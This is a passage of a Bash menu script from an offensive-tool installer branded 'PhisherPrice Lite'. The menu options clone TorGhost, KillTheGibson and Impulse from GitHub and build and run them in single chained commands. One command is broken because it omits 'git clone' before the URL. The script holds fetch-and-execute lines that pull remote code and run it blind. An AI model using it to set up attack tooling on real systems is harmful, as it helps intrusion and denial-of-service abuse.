elif [ "$x" == "$submenu418" ]; then                    #submenu4-Option-18
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
TorGhost Installation
\e[0;31m-------------------------------\e[1;34m'
echo "Are You Sure You Want To Install TorGhost"
echo "PRESS ENTER TO START ANY OTHER OPTION TO CANCEL"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
$r cd&&git clone https://github.com/SusmithKrishnan/torghost.git&&cd torghost&&chmod +x build.sh&&./build.sh&&bash install.sh
echo -e '\e[0;31m-------------------------------\e[1;33m
Fully Installed Torghost
\e[0;31m-------------------------------\e[1;34m'
echo "Press ENTER To Go Back To Main Menu"
echo -e '\e[0;31m-------------------------------'
read -p "~"
echo -e '\e[0;31m-------------------------------\e[0;39m'

elif [ "$x" == "$submenu419" ]; then                    #submenu4-Option-19
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
KillTheGibson Installation
\e[0;31m-------------------------------\e[1;34m'
echo "Are You Sure You Want To Install KIllTheGibson"
echo "PRESS ENTER TO START ANY OTHER OPTION TO CANCEL"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
$r cd&&https://github.com/m57/KillTheGibson&&cd KillTheGibson&&chmod +x killthegibson.sh&&./killthegibson.sh
echo "Download Complete , Launching KillTheGibson"

elif [ "$x" == "$submenu420" ]; then                    #submenu4-Option-19
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
Impulse Installation
\e[0;31m-------------------------------\e[1;34m'
echo "Are You Sure You Want To Install Impulse"
echo "PRESS ENTER TO START ANY OTHER OPTION TO CANCEL"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
$r git clone https://github.com/LimerBoy/Impulse&&cd Impulse&&pip3 install -r requirements.txt&&python3 impulse.py --help
echo "Installation Complete"

read

else 

n


fi
elif [ "$x" == "$info" ]; then                 #INFO                    
clear
echo -e '\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <    PhisherPrice Lite
   /<<< \_\_  Serve & Demolish
  /,)^>>_._ \ Version 1.0.3 [BETA] 
  (/   \\ /\\\    [\e[3;31m PUBLIC \e[1;33m]
       // //```
------((`((--------------------\e[3;31m 
        Information \e[1;33m 
------------------------------- \e[0m\e[3;39m
Created By\e[1;31m SirCryptic~\e[1;36mSCNS \e[1;34m
     Null Security Team

\e[1;31m      Contact Information \e[1;33m
------------------------------ \e[0m
    no-reply@nullsec.online
    https://nullsec.online

    we are not liable for any individual or damage
    by this tool
     \e[1;33m
------------------------------- \e[0m\e[3;39m
       CTRL + C To Exit \e[1;33m
------------------------------- \e[0m\e[3;39m
Press ENTER To Go To Main Menu \e[1;33m
------------------------------- \e[0m\e[3;39m'
echo -e $Blue" ┌─["$red"S&D$Blue]──[$red~$Blue]─["$yellow"Information$Blue]"
read -p      " └─────► " x

else 

n


fi
done
